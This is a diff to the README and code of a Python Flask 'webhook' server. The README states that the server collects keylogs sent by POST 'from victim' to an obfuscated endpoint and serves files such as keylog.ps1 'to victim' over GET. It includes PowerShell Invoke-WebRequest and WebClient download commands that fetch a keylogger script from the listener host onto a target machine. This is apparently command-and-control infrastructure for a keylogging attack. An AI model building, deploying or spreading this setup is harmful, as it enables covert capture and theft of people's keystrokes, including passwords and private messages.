@@ -7,12 +7,14 @@ Simple python script, to launch a web server which takes POST and GET requests.
 - Download the file `webhook`
 - Edit `app.run(host='IP_YOU_WANT_TO_LISTEN', port=PORT_NUMBER)` , to the IP and Port, you want to listen the incoming traffic.
 - Give permission `chmod 700 webhook`
+- Create subfolder `data` in the same location where `webhook` will be ran.
+	- Inside `data` you can put all the, for example files, you want to serve.
 - Run `./webhook`
   
 **Profit!**   
 Webhook is now running:
-- `/c2VydmVy` end point, for example `http://IP_YOU_WANT_TO_LISTEN/c2VydmVy, accepts POST requests, in our project, designed for receiving the keylogs from victim.
-- `/c2VydmVy/filename` endpoint takes GET requests, for example if you have `keylog.ps1` script in the same folder where the webhook is executed, you can fetch the script to victim:
+- `/c2VydmVy` end point, for example `http://IP_YOU_WANT_TO_LISTEN/c2VydmVy`, accepts POST requests, in our project, designed for receiving the keylogs from victim.
+- `/c2VydmVy/filename` endpoint takes GET requests, for example if you have `keylog.ps1` script in previously created `data` subfolder, same location where the webhook is executed, you can fetch the script to victim:
 	- Windows (2 examples): 
 		- `Invoke-WebRequest -Uri http://IP_YOU_WANT_TO_LISTEN/c2VydmVy/keylog.ps1 -OutFile "test.ps1"`
 		- `(New-Object System.Net.WebClient).DownloadFile("IP_YOU_WANT_TO_LISTEN/c2VydmVy/logger.ps1", "test.ps1")`
@@ -31,7 +33,7 @@ import os
 app = Flask(__name__)
 
 # Define the working dir to a variable
-WORKING_DIR = os.path.dirname(__file__)
+WORKING_DIR = "data"
 
 # Function to get the next available log number
 def get_next_log_number():
